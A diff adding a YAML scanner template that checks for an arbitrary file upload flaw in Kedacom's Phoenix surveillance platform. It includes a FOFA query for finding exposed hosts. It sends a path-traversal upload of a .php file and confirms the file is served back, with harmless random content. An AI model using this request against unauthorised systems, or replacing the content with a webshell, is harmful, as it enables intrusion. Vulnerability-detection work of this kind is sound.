@@ -1,0 +1,37 @@
+id: kedacom-phoenix-upload_fcgi-upload
+
+info:
+  name: 科达phoenix监控平台upload_fcgi接口任意文件上传漏洞
+  author: 熊猫也是猫
+  severity: critical
+  description: |-
+    FOFA: app="KEDACOM-phoenix监控平台"
+  tags: kedacom,phoenix,upload,file-upload
+  created: 2025/12/29
+
+set:
+  rfilename: randomLowercase(10)
+  rboundary: randomLowercase(8)
+  rbody: randomLowercase(32)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /pmc-bin/upload_fcgi?uploadDir=../&uploadName={{rfilename}}.php
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: |
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="Filedata"; filename="{{rfilename}}.php"
+        Content-Type: image/jpeg
+
+        {{rbody}}
+        ------WebKitFormBoundary{{rboundary}}--
+    expression: response.status == 200
+
+  r1:
+    request:
+      method: GET
+      path: /{{rfilename}}.php
+    expression: response.status == 200 && response.body.bcontains(bytes(rbody))
+expression: r0() && r1()
